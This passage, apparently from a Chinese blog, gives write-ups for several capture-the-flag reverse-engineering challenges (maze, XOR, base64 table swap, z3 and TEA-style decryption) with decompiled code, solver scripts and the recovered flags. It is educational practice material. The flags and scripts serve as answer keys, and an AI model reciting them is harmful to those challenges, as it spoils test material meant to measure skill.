class="number">0</span>;</span><br><span class="line">  getchar();</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(key);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i ) <span class="comment">// key大写变小写</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( key[v3 % v5] &gt; <span class="number">64</span> &amp;&amp; key[v3 % v5] &lt;= <span class="number">90</span> )</span><br><span class="line">      key[i] = key[v3 % v5] + <span class="number">32</span>;</span><br><span class="line">    ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input your flag:&quot;</span>, src);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = getchar();</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">32</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v1 &lt;= <span class="string">&#x27;`&#x27;</span> || v1 &gt; <span class="string">&#x27;z&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v1 &gt; <span class="string">&#x27;@&#x27;</span> &amp;&amp; v1 &lt;= <span class="string">&#x27;Z&#x27;</span> ) <span class="comment">// 这部分可以之间爆</span></span><br><span class="line">          str2[v2] = (v1 - <span class="number">39</span> - key[v3++ % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        str2[v2] = (v1 - <span class="number">39</span> - key[v3++ % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !(v3 % v5) )</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">32</span>);</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(text, str2) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Congratulation!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v12;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>爆破脚本:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">text = <span class="built_in">bytearray</span>(<span class="string">b&quot;killshadow&quot;</span>)</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">bytearray</span>(<span class="string">b&quot;ADSFKNDCLS&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">    c = key[i]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;@&#x27;</span>) &lt; c &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>):</span><br><span class="line">        key[i] += <span class="number">32</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x41</span>, <span class="number">0x80</span>):</span><br><span class="line">        <span class="keyword">if</span> ((f - <span class="number">39</span> - key[i] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>) == text[i]:</span><br><span class="line">            flag += <span class="built_in">chr</span>(f)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>得到flag</p><p>flag{KLDQCUDFZO}</p><h3 id="不一样的flag"><a href="#不一样的flag" class="headerlink" title="不一样的flag"></a>不一样的flag</h3><p>主逻辑在main中,根据经验,是一道典型的迷宫题</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [esp+17h] [ebp-35h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+30h] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+34h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+38h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+3Ch] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [esp+40h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  qmemcpy(&amp;v3, _data_start__, <span class="number">0x19</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you can choose one action to execute&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1 up&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2 down&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3 left&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;4 right\n:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v6);</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v6 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v6 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        --v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v6 != <span class="number">4</span> )</span><br><span class="line">LABEL_13:</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        ++v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      --v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(&amp;v4 + i) &lt; <span class="number">0</span> || *(&amp;v4 + i) &gt; <span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)&amp;v8 + <span class="number">5</span> * v4 + v5 - <span class="number">0x29</span>) == <span class="string">&#x27;1&#x27;</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)&amp;v8 + <span class="number">5</span> * v4 + v5 - <span class="number">0x29</span>) == <span class="string">&#x27;#&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\nok, the order you enter is the flag!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>迷宫在_data_start__中:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.data:<span class="number">00402000</span> __data_start__  db   <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span></span><br><span class="line">.data:<span class="number">00402000</span>                                         ; DATA XREF: _main+<span class="number">25</span>↑o</span><br><span class="line">.data:<span class="number">00402000</span>                 db   <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;0&#x27;</span></span><br><span class="line">.data:<span class="number">00402000</span>                 db   <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;0&#x27;</span></span><br><span class="line">.data:<span class="number">00402000</span>                 db   <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;0&#x27;</span></span><br><span class="line">.data:<span class="number">00402000</span>                 db   <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;#&#x27;</span></span><br></pre></td></tr></table></figure><p>因为是小迷宫,手走一遍就可以了:<code>222441144222</code></p><p>即flag:</p><p>flag{222441144222}</p><h3 id="Java逆向解密"><a href="#Java逆向解密" class="headerlink" title="Java逆向解密"></a>Java逆向解密</h3><p>XJad直接打开</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Decompiled by Jad v1.5.8e2. Copyright 2001 Pavel Kouznetsov.</span></span><br><span class="line"><span class="comment">// Jad home page: http://kpdus.tripod.com/jad.html</span></span><br><span class="line"><span class="comment">// Decompiler options: packimports(3) fieldsfirst ansi space</span></span><br><span class="line"><span class="comment">// Source File Name:   Reverse.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Reverse</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Scanner s = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;Please input the flag :&quot;</span>);</span><br><span class="line">        String str = s.next();</span><br><span class="line">        System.out.println(<span class="string">&quot;Your input is :&quot;</span>);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">        <span class="keyword">char</span> stringArr[] = str.toCharArray();</span><br><span class="line">        Encrypt(stringArr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Encrypt</span><span class="params">(<span class="keyword">char</span> arr[])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ArrayList Resultlist = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.length; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> result = arr[i] + <span class="number">64</span> ^ <span class="number">0x20</span>;</span><br><span class="line">            Resultlist.add(Integer.valueOf(result));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> KEY[] = &#123;</span><br><span class="line">            <span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>,</span><br><span class="line">            <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span></span><br><span class="line">        &#125;;</span><br><span class="line">        ArrayList KEYList = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; KEY.length; j++)</span><br><span class="line">            KEYList.add(Integer.valueOf(KEY[j]));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Result:&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (Resultlist.equals(KEYList))</span><br><span class="line">            System.out.println(<span class="string">&quot;Congratulations！&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            System.err.println(<span class="string">&quot;Error！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主逻辑也很简单,将输入加上 <code>64 ^ 0x20</code>,最后对比KEY</p><p>解密脚本:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key =  [<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>,</span><br><span class="line">            <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">    key[i] -= <span class="built_in">ord</span>(<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">    key[i] ^= <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,key)))</span><br></pre></td></tr></table></figure><p>得flag:</p><p>flag{This_is_the_flag_!}</p><h3 id="简单注册机"><a href="#简单注册机" class="headerlink" title="简单注册机"></a>简单注册机</h3><p>用JEB 3打开,发现主要判断如下</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/jdzcj-main.jpg" alt="jdzcj-main"></p><p>这里有两种解法</p><ul><li>直接构造输入<code>4b40000000000000000000000000000000a</code>, <code>0</code>为任意字符,即可让app直接输出flag</li><li>直接用python模拟flag生成流程</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v5 = <span class="built_in">bytearray</span>(<span class="string">b&quot;dd2940c84462b4dd7c450528835cca15&quot;</span>)</span><br><span class="line">v9 = <span class="number">2</span></span><br><span class="line">v2 =<span class="number">1</span></span><br><span class="line">v11 = <span class="number">0x1f</span></span><br><span class="line"></span><br><span class="line">v5[v9] = v5[v9] + v5[<span class="number">31</span>]-<span class="number">50</span></span><br><span class="line">v5[<span class="number">4</span>]= v5[v9] + v5[<span class="number">5</span>]-<span class="number">0x30</span></span><br><span class="line">v5 [<span class="number">30</span>]= v5[v11] + v5[<span class="number">9</span>]- <span class="number">0x30</span></span><br><span class="line">v5[<span class="number">14</span>]= (v5 [<span class="number">27</span>] + v5 [<span class="number">28</span>] - <span class="number">97</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    v5[i], v5[<span class="number">0x1f</span> - i] = v5[<span class="number">0x1f</span> - i], v5[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(v5)</span><br></pre></td></tr></table></figure><p>得flag</p><p>flag{59acc538825054c7de4b26440c0999dd}</p><ul><li>还是直接构造输入快….</li></ul><h3 id="GXYCTF2019-luck-guy"><a href="#GXYCTF2019-luck-guy" class="headerlink" title="[GXYCTF2019]luck_guy"></a>[GXYCTF2019]luck_guy</h3><p>IDA打开发现<code>getflag()</code>函数</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/luck-gay-main.jpg" alt="luck-gay-main"></p><p>解密脚本:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f1 = <span class="string">&quot;GXY&#123;do_not_&quot;</span></span><br><span class="line"></span><br><span class="line">f2 = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>,<span class="string">&#x27;fo`guci&#x27;</span>[::-<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">if</span> j % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        f2[j] -= <span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f2[j] -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(f1 + <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">chr</span>, f2))))</span><br></pre></td></tr></table></figure><p>换一下外包装,得flag:</p><p>flag{do_not_hate_me}</p><h3 id="ACTF新生赛2020-usualCrypt"><a href="#ACTF新生赛2020-usualCrypt" class="headerlink" title="[ACTF新生赛2020]usualCrypt"></a>[ACTF新生赛2020]usualCrypt</h3><p>换表base64 + 大小写转换</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64, string</span><br><span class="line"></span><br><span class="line">new_table = <span class="string">&quot;ABCDEFQRSTUVWXYPGHIJKLMNOZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">old_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&quot;</span>.swapcase()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(s.translate(<span class="built_in">str</span>.maketrans(new_table, old_table))))</span><br></pre></td></tr></table></figure><h3 id="WUSTCTF2020-level1"><a href="#WUSTCTF2020-level1" class="headerlink" title="[WUSTCTF2020]level1"></a>[WUSTCTF2020]level1</h3><p>简单加解密</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = [<span class="number">0</span>, <span class="number">198</span>,<span class="number">232</span>,<span class="number">816</span>,<span class="number">200</span>,<span class="number">1536</span>,<span class="number">300</span>,<span class="number">6144</span>,<span class="number">984</span>,<span class="number">51200</span>,<span class="number">570</span>,<span class="number">92160</span>,<span class="number">1200</span>,<span class="number">565248</span>,<span class="number">756</span>,<span class="number">1474560</span>,<span class="number">800</span>,<span class="number">6291456</span>,<span class="number">1782</span>,<span class="number">65536000</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    <span class="keyword">if</span> (i &amp; <span class="number">1</span>) != <span class="number">0</span>:</span><br><span class="line">        flag += <span class="built_in">bytes</span>([data[i] &gt;&gt; i])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="built_in">bytes</span>([data[i] // i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-Transform"><a href="#MRCTF2020-Transform" class="headerlink" title="[MRCTF2020]Transform"></a>[MRCTF2020]Transform</h3><p>简单加密</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = [<span class="number">0x67</span>, <span class="number">0x79</span>, <span class="number">0x7B</span>, <span class="number">0x7F</span>, <span class="number">0x75</span>, <span class="number">0x2B</span>, <span class="number">0x3C</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x79</span>, <span class="number">0x57</span>, <span class="number">0x5E</span>, <span class="number">0x5D</span>, <span class="number">0x42</span>, <span class="number">0x7B</span>, <span class="number">0x2D</span>, <span class="number">0x2A</span>, <span class="number">0x66</span>, <span class="number">0x42</span>, <span class="number">0x7E</span>, <span class="number">0x4C</span>, <span class="number">0x57</span>, <span class="number">0x79</span>, <span class="number">0x41</span>, <span class="number">0x6B</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0x3C</span>, <span class="number">0x5C</span>, <span class="number">0x45</span>, <span class="number">0x6F</span>, <span class="number">0x62</span>, <span class="number">0x4D</span>]</span><br><span class="line"></span><br><span class="line">xor_data = [<span class="number">0x00000009</span>, <span class="number">0x0000000A</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000017</span>, <span class="number">0x00000007</span>, <span class="number">0x00000018</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000006</span>, <span class="number">0x00000001</span>, <span class="number">0x00000010</span>, <span class="number">0x00000003</span>, <span class="number">0x00000011</span>, <span class="number">0x00000020</span>, <span class="number">0x0000001D</span>, <span class="number">0x0000000B</span>, <span class="number">0x0000001E</span>, <span class="number">0x0000001B</span>, <span class="number">0x00000016</span>, <span class="number">0x00000004</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000013</span>, <span class="number">0x00000014</span>, <span class="number">0x00000015</span>, <span class="number">0x00000002</span>, <span class="number">0x00000019</span>, <span class="number">0x00000005</span>, <span class="number">0x0000001F</span>, <span class="number">0x00000008</span>, <span class="number">0x00000012</span>, <span class="number">0x0000001A</span>, <span class="number">0x0000001C</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>]</span><br><span class="line"></span><br><span class="line">flag = [<span class="number">0</span>] * <span class="number">33</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">    flag[xor_data[i]] = data[i] ^ xor_data[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br></pre></td></tr></table></figure><h3 id="相册"><a href="#相册" class="headerlink" title="相册"></a>相册</h3><p>题目描述找邮箱，全局搜索mail, 找到<code>MailTask</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20210930114853781.png" alt="image-20210930114853781"></p><p>查看<code>sendMailByJavaMail</code>, 可知发送目标地址为<code>mailto</code>, 即第一个参数</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20210930115102226.png" alt="image-20210930115102226"></p><p>跟随<code>C2.MAILSERVER</code>, 可知调用的是native方法</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20210930115141903.png" alt="image-20210930115141903"></p><p>解压, base64解码<code>MTgyMTg0NjUxMjVAMTYzLmNvbQ==</code>得flag</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20210930115208041.png" alt="image-20210930115208041"></p><h3 id="WUSTCTF2020-level2"><a href="#WUSTCTF2020-level2" class="headerlink" title="[WUSTCTF2020]level2"></a>[WUSTCTF2020]level2</h3><p>upx直接脱壳即可</p><p>在汇编中看到flag</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20210930120143179.png" alt="image-20210930120143179"></p><h3 id="HDCTF2019-Maze"><a href="#HDCTF2019-Maze" class="headerlink" title="[HDCTF2019]Maze"></a>[HDCTF2019]Maze</h3><p>解壳后走个8 * 10迷宫即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:00408030                 db &#x27;*******+**&#x27;</span><br><span class="line">.data:0040803A                 db &#x27;******* **&#x27;</span><br><span class="line">.data:00408044                 db &#x27;****    **&#x27;</span><br><span class="line">.data:0040804E                 db &#x27;**   *****&#x27;</span><br><span class="line">.data:00408058                 db &#x27;** **F****&#x27;</span><br><span class="line">.data:00408062                 db &#x27;**    ****&#x27;</span><br><span class="line">.data:0040806C                 db &#x27;**********&#x27;</span><br></pre></td></tr></table></figure><p>flag{ssaaasaassdddw}</p><p>p.s. 由于没有校验，所以直接穿墙过也可以，只要满足步伐13就可以，例如<code>ssaaasaassdwdd</code></p><h3 id="GWCTF-2019-xxor"><a href="#GWCTF-2019-xxor" class="headerlink" title="[GWCTF 2019]xxor"></a>[GWCTF 2019]xxor</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ( a1[2] - a1[3] == 2225223423LL</span><br><span class="line">   &amp;&amp; a1[3] + a1[4] == 4201428739LL</span><br><span class="line">   &amp;&amp; a1[2] - a1[4] == 1121399208LL</span><br><span class="line">   &amp;&amp; *a1 == -548868226</span><br><span class="line">   &amp;&amp; a1[5] == 0x84F30420</span><br><span class="line">   &amp;&amp; a1[1] == 0x20CAACF4 )</span><br></pre></td></tr></table></figure><p>z3直接解，得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[3746099070, 550153460, 3774025685, 1548802262, 2652626477, 2230518816]</span><br></pre></td></tr></table></figure><p>后一个简单加密, 最终脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">x = [Int(<span class="string">&#x27;x%d&#x27;</span> % i)  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(x[<span class="number">2</span>] - x[<span class="number">3</span>] == <span class="number">0x84A236FF</span>)</span><br><span class="line">s.add(x[<span class="number">3</span>] + x[<span class="number">4</span>] == <span class="number">4201428739</span>)</span><br><span class="line">s.add(x[<span class="number">2</span>] - x[<span class="number">4</span>] == <span class="number">1121399208</span>)</span><br><span class="line">s.add(x[<span class="number">0</span>] == <span class="number">0xDF48EF7E</span>)</span><br><span class="line">s.add(x[<span class="number">5</span>] == <span class="number">0x84F30420</span>)</span><br><span class="line">s.add(x[<span class="number">1</span>] == <span class="number">0x20CAACF4</span>)</span><br><span class="line"></span><br><span class="line">data = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        data.append(m[x[i]].as_long())</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line">key = [<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>, <span class="number">2</span>):</span><br><span class="line">    v3 = data[i]</span><br><span class="line">    v4 = data[i+<span class="number">1</span>]</span><br><span class="line">    v5 = <span class="number">0x458BCD42</span> * <span class="number">0x40</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3f</span> + <span class="number">1</span>):</span><br><span class="line">        v4 -= (v3 + v5 + <span class="number">20</span>) ^ ((v3 &lt;&lt; <span class="number">6</span>) + key[<span class="number">2</span>]) ^ ((v3 &gt;&gt; <span class="number">9</span>) + key[<span class="number">3</span>]) ^ <span class="number">0x10</span></span><br><span class="line">        v4 &amp;= <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">        v3 -= (v4 + v5 + <span class="number">11</span>) ^ ((v4 &lt;&lt; <span class="number">6</span>) + key[<span class="number">0</span>]) ^ ((v4 &gt;&gt; <span class="number">9</span>) + key[<span class="number">1</span>]) ^ <span class="number">0x20</span></span><br><span class="line">        v3 &amp;= <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">        v5 -= <span class="number">0x458BCD42</span></span><br><span class="line">        v5 &amp;= <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">    data[i] = v3</span><br><span class="line">    data[i+<span class="number">1</span>] = v4</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">   flag += long_to_bytes(i)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-Xor"><a href="#MRCTF2020-Xor" 